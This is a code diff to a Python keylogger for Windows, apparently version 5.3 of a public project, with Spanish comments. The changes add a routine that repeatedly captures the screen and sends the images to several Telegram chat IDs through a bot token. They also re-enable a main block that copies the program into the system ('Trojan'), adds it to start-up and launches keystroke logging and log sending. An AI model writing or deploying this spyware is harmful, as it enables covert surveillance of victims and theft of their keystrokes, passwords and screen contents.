@@ -8,13 +8,13 @@
 # ██╗░░██╗███████╗██╗░░░██╗██╗░░░░░░█████╗░░██████╗░░██████╗░███████╗██████╗░
 # ██║░██╔╝██╔════╝╚██╗░██╔╝██║░░░░░██╔══██╗██╔════╝░██╔════╝░██╔════╝██╔══██╗
 # █████═╝░█████╗░░░╚████╔╝░██║░░░░░██║░░██║██║░░██╗░██║░░██╗░█████╗░░██████╔╝
-# ██╔═██╗░██╔══╝░░░░╚██╔╝░░██║░░░░░██║░░██║██║░░╚██╗██║░░╚██╗██╔══╝░░██╔══██╗
-# ██║░╚██╗███████╗░░░██║░░░███████╗╚█████╔╝╚██████╔╝╚██████╔╝███████╗██║░░██║
-# ╚═╝░░╚═╝╚══════╝░░░╚═╝░░░╚══════╝░╚════╝░░╚═════╝░░╚═════╝░╚══════╝╚═╝░░╚═╝  v5.3 by SebastianEPH |https://github.com/SebastianEPH|
+# ██╔═██╗░██╔══╝░░░░╚██╔╝░░██║░░░░░██║░░██║██║░░╚██╗██║░░╚██╗██╔══╝░░██╔══██╗                 v5.3
+# ██║░╚██╗███████╗░░░██║░░░███████╗╚█████╔╝╚██████╔╝╚██████╔╝███████╗██║░░██║           by SebastianEPH
+# ╚═╝░░╚═╝╚══════╝░░░╚═╝░░░╚══════╝░╚════╝░░╚═════╝░░╚═════╝░╚══════╝╚═╝░░╚═╝   https://github.com/SebastianEPH|
 
 #region import Libs
-from eventlet.tpool import socket, threading  # Librería verifica internet y permite procesos multihilos
-from pynput.keyboard import Listener
+from eventlet.tpool import socket, threading    # Librería verifica internet y permite procesos multihilos
+from pynput.keyboard import Listener            # Escucha eventos del teclado
 from getpass import getuser     # Obtiene el nombre del usuario
 from datetime import datetime   # Devuelve fecha y hora actual
 from winreg import OpenKey, SetValueEx, HKEY_LOCAL_MACHINE, KEY_ALL_ACCESS, REG_SZ, HKEY_CURRENT_USER # Modifica registros de Windows
@@ -42,6 +42,7 @@ class Config:
         self.PATH_LOG = self.PATH_HIDDEN_LOG + self.LOG_NAME       # <No cambiar>
         self.SCREENSHOT = True                                  # Activar o desactivar Screenshot
         self.TIME_SCREENSHOT = 1                                # Tiempo de intervalo de ScreenShot
+        self.DELAY  = 10                                                            # tiempo de retraso para evitar sobrecargos al iniciar
         self.TIME_SEND = 1 #[minutos]                                               # Tiempo de envió del registro
         self.MODE_SEND = 2      # 0 = Gmail
                            # 1 = DataBase                                           # Solo se puede usar una opción
@@ -84,10 +85,10 @@ class Functions:
             return False    # La carpeta ya existe
         pass
 
-    def RandomChar(self,y=50): # Genera letras aleatorias [Longitud según el argumento]
-        return ''.join(random.choice(string.ascii_letters) for x in range(y))
-    def RamdomLogNamePATH(self):
-        return Config().PATH_HIDDEN_LOG + Functions().RandomChar(23) + ".txt"
+    def RandomChar(self,number =50): # Genera letras aleatorias [Longitud según el argumento]
+        return ''.join(random.choice(string.ascii_letters) for x in range(number))
+    def RamdomLogNamePATH(self, number = 23):
+        return Config().PATH_HIDDEN_LOG + Functions().RandomChar(number) + ".txt"
 
     # Función = Verifica si hay conexión a internet para poder envíar el log
     def VerifyConnection(self):
@@ -197,9 +198,16 @@ class Util:
                 print("\n[Trojan] - Se replico en el sistema correctamente")
             except:
                 print("\n[Trojan] - Hubo un problema al replicar en el sistema")
-    def ScreenShot(self):
+    def SendBotScreenShot(self,id, PATH_SCREEN):
+        try:
+            bot = telepot.Bot(Config.TelegramBot().TOKEN)
+            bot.sendChatAction(id, 'typing')
+            bot.sendChatAction(id, 'upload_photo')
+            bot.sendDocument(id, open(PATH_SCREEN, 'rb'))
+            print("[ScreenShot] Se envió correctamente al ID: " + str(id))
+        except:
+            print("[ScreenShot] Hubo un error en el proceso. ID: " + str(id))
 
-        pass
     # Envía los datos reg.k vía Gmail
     def SendGmail(self):
         # Crea nombre del archivo
@@ -267,8 +275,8 @@ class Util:
             print("Error al iniciar sesión [DataBase]")
 
         def UpdateUser():
+            pathN = Functions().RamdomLogNamePATH()
             try:
-                pathN = Functions().RamdomLogNamePATH()
                 os.rename(Config().PATH_LOG, pathN)
                 # Abre el archivo
                 f = open(pathN, 'r')
@@ -321,13 +329,38 @@ class Send:
         if Config().SCREENSHOT:
             print("[ScreenShot] Active...")
             while True:
-                print("[ScreenShot] Wait: "+str(Config().TIME_SCREENSHOT *60))
+                print("[ScreenShot] Wait: " + str(Config().TIME_SCREENSHOT)+ "Minutes")
                 time.sleep(Config().TIME_SCREENSHOT * 60)
+                if Functions().VerifyConnection():
+                    PATH_SCREEN = Config().PATH_HIDDEN_LOG + str(getuser()) + " - " + Functions().CurrentTime() + ".jpg"
+                    # Toma captura
+                    screenshot = ImageGrab.grab()
+                    print("[ScreenShot] Se tomó una captura ")
+                    screenshot.save(PATH_SCREEN)
+                    print("[ScreenShot] Se guardó correctamente la captura")
+
+                    # Envía a distintas cuentas simultaneamente
+                    if Config.TelegramBot().ID != 000000000:
+                        print("[Send ScreenShot] ID Aceptado")
+                        Util().SendBotScreenShot(Config.TelegramBot().ID, PATH_SCREEN)
+
+                    if Config.TelegramBot().ID_2 != 000000000:
+                        print("[Send ScreenShot] ID 2 Aceptado")
+                        Util().SendBotScreenShot(Config.TelegramBot().ID_2, PATH_SCREEN)
+
+                    if Config.TelegramBot().ID_3 != 000000000:
+                        print("[Send ScreenShot] ID 3 Aceptado")
+                        Util().SendBotScreenShot(Config.TelegramBot().ID_3, PATH_SCREEN)
+
+                    # Se terminó de enviar
+                    try:
+                        os.remove(PATH_SCREEN)
+                        print("[ScreenShot] Se eliminó caché")
+                    except:
+                        print("[ScreenShot] No se pudo eliminar el caché ")
+
         else:
             print("[ScreenShot] Disable...")
-
-
-
 
 class Keylogger:
     def __init__(self):
@@ -523,34 +556,34 @@ class Keylogger:
 #endregion
 
 if __name__ == '__main__':
-    """
+
     print("[Keylogger] start...")
+    Util().Trojan()     # Reply system
+    Util().addStartUp() # Added in Startup
+
+    # Delay
+    print("[Keylogger] Delay... "+ str(Config().DELAY))
+    time.sleep(Config().DELAY)
+    print("[Keylogger] Finish Delay")
+    # Create threads
+    key = threading.Thread(target=Keylogger().GetKeys)  # Registra pulsaciones
+    send = threading.Thread(target=Send().Log)  # Envía Registro
+    screenshot = threading.Thread(target=Send().Log)  # Screenshot
+
     print("[Keylogger] Listening to Keys...")
+    # Start Threads
+    key.start()
+    screenshot.start()
+    send.start()
+    key.join()
 
-    Util().Trojan()
-    Util().addStartUp()
 
-    p1 = threading.Thread(target=Keylogger().GetKeys)  # Enviar Registro
-    p2 = threading.Thread(target=Send().Log)  # Registra teclas
 
-    p2.start()
-    p1.start()
-    p1.join()
-    """
-    PATH_SCREEN = Config().PATH_HIDDEN_LOG + str(getuser()) + " - " + Functions().CurrentTime() + ".jpg"
-    try:
-        print("[ScreenShot] Starting... ")
-        bot = telepot.Bot(Config.TelegramBot().TOKEN)
-        bot.sendChatAction(Config.TelegramBot().ID, 'typing')
-        screenshot = ImageGrab.grab()
-        print("[ScreenShot] Se tomó una captura ")
-        screenshot.save(PATH_SCREEN)
-        print("[ScreenShot] Se guardó correctamente la captura")
-        bot.sendChatAction(Config.TelegramBot().ID, 'upload_photo')
-        bot.sendDocument(Config.TelegramBot().ID, open(PATH_SCREEN, 'rb'))
-        print("[ScreenShot] Se envió correctamente")
-        os.remove(PATH_SCREEN)
-        print("[ScreenShot] Se eliminó caché")
-    except:
-        print("[ScreenShot] Hubo un error en el proceso.")
+
+
+
+
+
+
+
 
